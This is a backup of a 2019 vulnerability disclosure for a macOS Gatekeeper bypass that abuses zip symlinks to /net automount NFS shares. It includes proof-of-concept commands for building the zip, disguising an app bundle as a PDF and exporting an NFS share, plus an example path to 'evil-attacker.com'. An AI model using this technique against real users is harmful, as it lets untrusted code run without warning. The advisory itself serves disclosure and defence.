# macos_gatekeeper_bypass (*article backup)
 bypass Gatekeeper in order to execute untrusted code without any warning or user's explicit permission.
sources: https://www.fcvl.net/vulnerabilities/macosx-gatekeeper-bypass
https://www.sentinelone.com/blog/how-malware-bypass-macos-gatekeeper/

MacOS X GateKeeper Bypass
24 May 2019

OVERVIEW
On MacOS X version <= 10.14.5 (at time of writing) it is possible to easily bypass Gatekeeper in order to execute untrusted code without any warning or user's explicit permission.

Gatekeeper is a mechanism developed by Apple and included in MacOS X since 2012 that enforces code signing and verifies downloaded applications before allowing them to run.
For example, if a user donwloads an application from internet and executes it, Gatekeeper will prevent it from running without user's consens.

DETAILS
As per-design, Gatekeeper considers both external drives and network shares as safe locations and it allows any application they contain to run.
By combining this design with two legitimate features of MacOS X, it will result in the complete deceivement of the intended behaviour.

The first legit feature is automount (aka autofs) that allows a user to automatically mount a network share just by accessing a "special" path, in this case, any path beginning with "/net/".
For example
ls /net/evil-attacker.com/sharedfolder/
will make the os read the content of the 'sharedfolder' on the remote host (evil-attacker.com) using NFS.

The second legit feature is that zip archives can contain symbolic links pointing to an arbitrary location (including automount enpoints) and that the software on MacOS that is responsable to decompress zip files do not perform any check on the symlinks before creatig them.

To better understand how this exploit works, let's consider the following scenario:
An attacker crafts a zip file containing a symbolic link to an automount endpoint she/he controls (ex Documents -> /net/evil.com/Documents) and sends it to the victim.
The victim downloads the malicious archive, extracts it and follows the symlink.

Now the victim is in a location controlled by the attacker but trusted by Gatekeeper, so any attacker-controlled executable can be run without any warning. The way Finder is designed (ex hide .app extensions, hide full path from titlebar) makes this tecnique very effective and hard to spot.

The following video illustrates the concept

https://youtu.be/m74cpadIPZY

PoC
In order to reproduce this issue, follow the steps below:

create a zip file with a symlink to an automount endpoint
mkdir Documents
ln -s /net/linux-vm.local/nfs/Documents Documents/Documents
zip -ry Documents.zip Documents
create an application (.app folder) with the code you want to run
cp -r /Applications/Calculator.app PDF.app
echo -e '#!/bin/bash'"\n"'open /Applications/iTunes.app' > PDF.app/Contents/MacOS/Calculator
chmod +x PDF.app/Contents/MacOS/Calculator
rm PDF.app/Contents/Resources/AppIcon.icns
ln -s /System/Library/CoreServices/CoreTypes.bundle/Contents/Resources/GenericFolderIcon.icns PDF.app/Contents/Resources/AppIcon.icns
create a publicily accessible NFS share and put the .app in it
ssh linux-vm.local
mkdir -p /nfs/Documents
echo '/nfs/Documents *(insecure,rw,no_root_squash,anonuid=1000,anongid=1000,async,nohide)' >> /etc/exports
service nfs-kernel-server restart
scp -r mymac.local:PDF.app /nfs/Documents/
upload the zip somewhere in internet and download it so it gets the quarantine flag used by Gatekeeper
extract the zip (if needed) and navigate it
HISTORY
The vendor has been contacted on February 22th 2019 and it's aware of this issue. This issue was supposed to be addressed, according to the vendor, on May 15th 2019 but Apple started dropping my emails.
Since Apple is aware of my 90 days disclosure deadline, I make this information public.

SOLUTION
No solution is available yet.

A possible workaround is to disable automount:

Edit /etc/auto_master as root
Comment the line beginning with '/net'
Reboot
